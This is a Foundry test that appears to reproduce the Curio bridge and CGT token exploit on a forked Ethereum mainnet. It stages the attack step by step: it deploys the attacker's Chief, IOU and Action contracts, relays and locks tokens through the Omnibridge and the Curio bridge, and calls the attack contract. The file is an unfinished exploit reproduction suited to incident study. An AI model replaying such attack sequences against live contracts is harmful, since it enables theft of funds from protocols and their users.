// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import "./AttackerContract.sol";
import "./Interfaces.sol";

contract Exploit_Curio is TestHarness, TokenBalanceTracker {
    // Instances of tokens involved
    IDSToken cgtToken = IDSToken(0xF56b164efd3CFc02BA739b719B6526A6FA1cA32a);

    // Instances of relevant contracts
    // Attacker contracts
    Action attackerContract;
    Chief chief;
    IOUToken IOU;

    // Peripheral contracts
    IForeignOmnibridge foreignOmniBridge = IForeignOmnibridge(0x69c707d975e8d883920003CC357E556a4732CD03);
    ICurioBridge curioBridge = ICurioBridge(0x9b8A09b3f538666479a66888441E15DDE8d13412);

    address ATTACKER = makeAddr("ATTACKER");

    function setUp() external {
        // Create a fork right before the attack started
        cheat.createSelectFork("mainnet", 19_491_672);

        // Setup attackers account
        deal(address(cgtToken), ATTACKER, 100 ether);

        // Initialize labels and token tracker
        _labelAccounts();
        _tokenTrackerSetup();
    }

    function test_attack() public {
        // TODO we should adjust/warp each's step timestamp or block
        console.log("\n==== STEP 0: Deploy attack contracts used by Action ====");
        // These contracts were deployed almost 3 years before the attack
        deployInitialContracts();

        console.log("\n==== STEP 1: Send tokens to Omnibridge ====");
        // Approve tx: 0x0b4a076b4fe1d873b75e7fadc3d99e0240a61fa23f5327782416588f09c32295
        // Relay tx: 0xf653d1d9c18bf0be78c5b7a2c58c9286bf02fd2b4c8d2106180929526b7fc151
        cheat.startPrank(ATTACKER);
        cgtToken.approve(address(foreignOmniBridge), 10 ether);
        foreignOmniBridge.relayTokens(address(cgtToken), 10 ether);
        console.log("Relay successful");
        cheat.stopPrank();

        console.log("\n==== STEP 2: Lock tokens to Curio Bridge ====");
        // Approve tx: 0x08e5c70d3407acec5cb85ff064e5fe029eca191d16966d1aaac6613702a0c6ce
        // Lock tx: 0xf653d1d9c18bf0be78c5b7a2c58c9286bf02fd2b4c8d2106180929526b7fc151
        cheat.startPrank(ATTACKER);
        cgtToken.approve(address(curioBridge), 10 ether);
        curioBridge.lock(bytes32(0), address(cgtToken), 10 ether);
        // we pass an arb to address on Curio Parachain
        console.log("Lock successful");
        cheat.stopPrank();

        console.log("\n==== STEP 3: Deploy Attacker's contract (called Action) ====");
        // Deploy tx: 0x99cc992de6e42a0817713489aeeb21f2d5e5fdca1f833826be09a9f35e5654e3
        cheat.prank(ATTACKER);
        attackerContract = new Action(address(chief));
        require(address(attackerContract).code.length != 0, "Attacker's contract deployment failed");
        console.log("Attacker's contract deployement successful");

        console.log("\n==== STEP 4: Call cook() on Action, start attack ====");
        cheat.startPrank(ATTACKER);
        cgtToken.approve(address(attackerContract), 2 ether); // 0x6a4cb2aa03ebf35f25e9f34a1727f7e0ea34c5e59cebc85b9e9c0729c6b0ad59
        attackerContract.cook(address(cgtToken), 2 ether, 10 ether, 10 ether);
        cheat.stopPrank();
        // the last two params were set to some arbitrary-like values but are unused in the call.
        // Just for profit checks:
        /*
            require(weth.balanceOf(address(this)) >= wethMin, "not enought weth");
            require(dai.balanceOf(address(this)) >= daiMin, "not enought dai");
        */

        /*
        // Next steps:
        1. Mint CGT tokens via executor's contract
        2. Evaluate if the other previous calls that only emit events (likely changing only some attacker's
           contract storage)  are necessary
        */
    }

    function deployInitialContracts() internal {
        // Chief deployment: 0x83661c0bb2d1288c523aba5aaa9f78d237eb6d068f5374ce221c38b0c088c598
        // IOU deployment: 0x8b8ef358b5407298bc7e77e77575993a3f559b4f343e26f1c5cf721e6922cf46
        cheat.prank(ATTACKER);
        IOU = new IOUToken();
        require(address(IOU).code.length != 0, "IOU token deployment failed");
        console.log("IOU token contract deployement successful");

        cheat.prank(ATTACKER);
        chief = new Chief(address(cgtToken), address(IOU), type(uint256).max);
        require(address(chief).code.length != 0, "Chief deployment failed");
        console.log("Chief contract deployement successful");
    }

    function _labelAccounts() internal {
        cheat.label(ATTACKER, "Attacker");

        cheat.label(address(foreignOmniBridge), "ForeignOmniBridge");
        cheat.label(address(cgtToken), "CGT Token");
    }

    function _tokenTrackerSetup() internal {
        // Add relevant tokens to tracker

        // Initialize user's state
        updateBalanceTracker(address(this));
    }
}
